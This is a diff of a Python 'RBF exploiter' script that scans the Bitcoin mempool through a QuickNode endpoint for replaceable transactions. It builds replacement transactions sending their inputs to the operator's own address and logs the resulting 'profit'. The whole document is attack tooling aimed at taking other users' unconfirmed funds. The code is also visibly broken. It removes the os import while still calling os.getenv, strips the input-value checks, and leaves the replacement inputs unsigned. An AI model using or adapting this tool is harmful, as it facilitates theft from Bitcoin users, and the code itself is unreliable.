@@ -13,7 +13,6 @@ Features:
 import sys
 import json
 import hashlib
-import os
 import requests
 import time
 import struct
@@ -24,7 +23,7 @@ from typing import Dict, List, Optional, Any, Tuple
 import base58
 import random
 import signal
-from decimal import Decimal, InvalidOperation, ROUND_DOWN
+from decimal import Decimal, InvalidOperation
 
 # ----------------------------------------------------------------------
 # CONFIG & LOGGING
@@ -51,11 +50,7 @@ MAX_WORKERS = 5  # Number of parallel workers
 MAX_TXS_TO_PROCESS = 1000  # Limit transactions to process
 BATCH_SIZE = 20  # Process transactions in batches
 SAT_PER_BTC = Decimal("100000000")
-DEFAULT_QUICKNODE_ENDPOINT = "https://greatest-billowing-grass.btc.quiknode.pro/"
-env_endpoint = os.getenv("QUICKNODE_ENDPOINT")
-if env_endpoint is not None:
-    env_endpoint = env_endpoint.strip() or None
-QUICKNODE_ENDPOINT = env_endpoint or DEFAULT_QUICKNODE_ENDPOINT
+QUICKNODE_ENDPOINT = os.getenv("QUICKNODE_ENDPOINT")
 
 # ----------------------------------------------------------------------
 # API ENDPOINTS
@@ -75,15 +70,16 @@ class Statistics:
         self.rbf_txs_found = 0
         self.successful_sweeps = 0
         self.total_profit_sat = 0
+        self.processed_txs = 0
 
-    def record_checked(self):
+    def update(self, is_rbf=False, success=False, profit_sat=0):
         self.total_txs_checked += 1
-
-    def record_rbf(self, success: bool = False, profit_sat: int = 0):
-        self.rbf_txs_found += 1
+        if is_rbf:
+            self.rbf_txs_found += 1
         if success:
             self.successful_sweeps += 1
             self.total_profit_sat += profit_sat
+        self.processed_txs += 1
 
     def get_stats(self):
         runtime = time.time() - self.start_time
@@ -96,7 +92,7 @@ class Statistics:
             "successful_sweeps": self.successful_sweeps,
             "total_profit_sat": self.total_profit_sat,
             "profit_per_hour_sat": self.total_profit_sat / runtime_hours if runtime_hours > 0 else 0,
-            "txs_per_hour": self.total_txs_checked / runtime_hours * 3600 if runtime_hours > 0 else 0,
+            "txs_per_hour": self.processed_txs / runtime_hours * 3600 if runtime_hours > 0 else 0,
             "rbf_per_hour": self.rbf_txs_found / runtime_hours * 3600 if runtime_hours > 0 else 0
         }
 
@@ -120,25 +116,12 @@ class BitcoinUtils:
         decoded = BitcoinUtils.base58_decode(addr)
         return b'\x76\xa9\x14' + decoded[1:-4] + b'\x88\xac'
 
-    @staticmethod
-    def encode_varint(value: int) -> bytes:
-        if value < 0xfd:
-            return value.to_bytes(1, "little")
-        if value <= 0xffff:
-            return b"\xfd" + value.to_bytes(2, "little")
-        if value <= 0xffffffff:
-            return b"\xfe" + value.to_bytes(4, "little")
-        return b"\xff" + value.to_bytes(8, "little")
-
 # ----------------------------------------------------------------------
 # RBF EXPLOITER
 # ----------------------------------------------------------------------
 class RBFSweeper:
-    def __init__(self, destination_address: str, endpoint: str):
+    def __init__(self, destination_address: str):
         self.destination_address = destination_address
-        if not isinstance(endpoint, str) or not endpoint.strip():
-            raise ValueError("A valid QuickNode endpoint URL is required")
-        self.quicknode_endpoint = endpoint
         self.session = requests.Session()
         self.session.headers["User-Agent"] = "RBFSweeper/6.1"
         self.shutdown_flag = False
@@ -151,20 +134,13 @@ class RBFSweeper:
     @staticmethod
     def _btc_to_sat(value: Any) -> Optional[int]:
         """Convert a BTC value (possibly negative) into satoshis."""
-        if value is None or isinstance(value, bool):
+        if value is None:
             return None
-        if isinstance(value, int):
-            return abs(value)
         try:
             dec_value = Decimal(str(value))
         except (InvalidOperation, TypeError, ValueError):
             return None
-        scaled = (dec_value.copy_abs() * SAT_PER_BTC)
-        try:
-            quantized = scaled.quantize(Decimal("1"), rounding=ROUND_DOWN)
-        except InvalidOperation:
-            return None
-        return int(quantized)
+        return int((dec_value.copy_abs() * SAT_PER_BTC).to_integral_value())
 
     @staticmethod
     def _is_replaceable(flag: Any) -> bool:
@@ -244,7 +220,7 @@ class RBFSweeper:
                 "method": "getrawmempool",
                 "params": [True]  # Include transaction details
             }
-            r = self.session.post(self.quicknode_endpoint, json=payload, timeout=30)
+            r = self.session.post(QUICKNODE_ENDPOINT, json=payload, timeout=30)
             if r.status_code == 200:
                 data = r.json()
                 mempool = data.get("result", {})
@@ -271,7 +247,7 @@ class RBFSweeper:
                 "method": "getrawtransaction",
                 "params": [txid, True]
             }
-            r = self.session.post(self.quicknode_endpoint, json=payload, timeout=15)
+            r = self.session.post(QUICKNODE_ENDPOINT, json=payload, timeout=15)
             if r.status_code != 200:
                 return None
             data = r.json()
@@ -304,13 +280,11 @@ class RBFSweeper:
             if self.shutdown_flag:
                 break
             self._delay()
-            self.stats.record_checked()
+            self.stats.update()
             txid = entry["txid"]
             mempool_info = entry.get("mempool_info")
-            if mempool_info:
-                replaceable_flag = mempool_info.get("bip125-replaceable")
-                if replaceable_flag is not None and not self._is_replaceable(replaceable_flag):
-                    continue
+            if not self._is_replaceable(mempool_info.get("bip125-replaceable")):
+                continue
             result = self.check_rbf_status(txid, mempool_info)
             if result:
                 rbf_txs.append(result)
@@ -342,7 +316,7 @@ class RBFSweeper:
                 "method": "getrawtransaction",
                 "params": [tx_data["txid"], True]
             }
-            r = self.session.post(self.quicknode_endpoint, json=payload, timeout=15)
+            r = self.session.post(QUICKNODE_ENDPOINT, json=payload, timeout=15)
             if r.status_code != 200:
                 log.error(f"Failed to fetch transaction details for {tx_data['txid']}")
                 return None
@@ -355,31 +329,8 @@ class RBFSweeper:
 
             original_fee = tx_data.get("fee", 0)
             total_output = tx_data.get("value", 0)
+            total_in = total_output + original_fee
             vsize = tx_data.get("vsize") or 180
-
-            input_total = 0
-            for txin in vin_entries:
-                prevout = txin.get("prevout")
-                if not prevout:
-                    log.warning("Missing prevout data; cannot determine input value")
-                    return None
-                prev_value_sat = self._btc_to_sat(prevout.get("value"))
-                if prev_value_sat is None:
-                    log.warning("Invalid prevout value; skipping transaction")
-                    return None
-                input_total += prev_value_sat
-
-            if input_total <= 0:
-                log.warning("Total input value is zero; skipping")
-                return None
-
-            if not original_fee:
-                original_fee = input_total - total_output
-                if original_fee <= 0:
-                    log.warning("Unable to determine original fee; skipping")
-                    return None
-
-            total_in = input_total
 
             target_fee = max(fee_rate * vsize, original_fee + 1000)
             if target_fee >= total_in:
@@ -398,20 +349,16 @@ class RBFSweeper:
                 prev_hash = bytes.fromhex(txin["txid"])[::-1]
                 prev_idx = struct.pack("<I", txin["vout"])
                 sequence = struct.pack("<I", txin.get("sequence", 0xfffffffd))
-                tx_ins.append(prev_hash + prev_idx + BitcoinUtils.encode_varint(0) + sequence)
+                tx_ins.append(prev_hash + prev_idx + b"\x00" + sequence)
 
             pk_script = BitcoinUtils.scriptpubkey_from_addr(self.destination_address)
-            output = (
-                struct.pack("<Q", out_val)
-                + BitcoinUtils.encode_varint(len(pk_script))
-                + pk_script
-            )
+            output = struct.pack("<Q", out_val) + bytes([len(pk_script)]) + pk_script
 
             raw_tx = (
                 b"\x02\x00\x00\x00" +
-                BitcoinUtils.encode_varint(len(tx_ins)) +
+                bytes([len(tx_ins)]) +
                 b"".join(tx_ins) +
-                BitcoinUtils.encode_varint(1) +
+                b"\x01" +
                 output +
                 b"\x00\x00\x00\x00"
             ).hex()
@@ -457,7 +404,7 @@ class RBFSweeper:
         log.info(f"Building RBF transaction for {txid}...")
         result = self.build_rbf_tx(tx_data, fee_rate)
         if not result:
-            self.stats.record_rbf(success=False)
+            self.stats.update(is_rbf=True, success=False)
             return {"status": "error", "error": "Failed to build RBF transaction"}
 
         raw_tx, profit_sat = result
@@ -467,10 +414,10 @@ class RBFSweeper:
 
         success = any(v.get("status") == "success" for v in broadcast.values())
         if success:
-            self.stats.record_rbf(success=True, profit_sat=profit_sat)
+            self.stats.update(is_rbf=True, success=True, profit_sat=profit_sat)
             log.info(f"SUCCESS -> Profit: {profit_sat} sat")
         else:
-            self.stats.record_rbf(success=False)
+            self.stats.update(is_rbf=True, success=False)
             log.warning(f"Failed to sweep {txid}")
 
         return {
@@ -538,11 +485,8 @@ def main():
     parser.add_argument("--output", type=str, default="rbf_results.json", help="Output file (default: rbf_results.json)")
     args = parser.parse_args()
 
-    if not isinstance(QUICKNODE_ENDPOINT, str) or not QUICKNODE_ENDPOINT.strip():
-        log.error(
-            "QUICKNODE_ENDPOINT is not configured. Set the QUICKNODE_ENDPOINT environment variable or update the"
-            " DEFAULT_QUICKNODE_ENDPOINT constant with your QuickNode URL."
-        )
+    if "your-api-key-here" in QUICKNODE_ENDPOINT:
+        log.error("Please replace 'your-api-key-here' in the QUICKNODE_ENDPOINT with your actual QuickNode API key")
         return
 
     print(f"""
@@ -555,7 +499,7 @@ def main():
 ╚═══════════════════════════════════════════════════════════╝
     """)
 
-    sweeper = RBFSweeper(args.destination, QUICKNODE_ENDPOINT)
+    sweeper = RBFSweeper(args.destination)
     try:
         results = sweeper.run(args.fee_rate)
         with open(args.output, "w") as f:
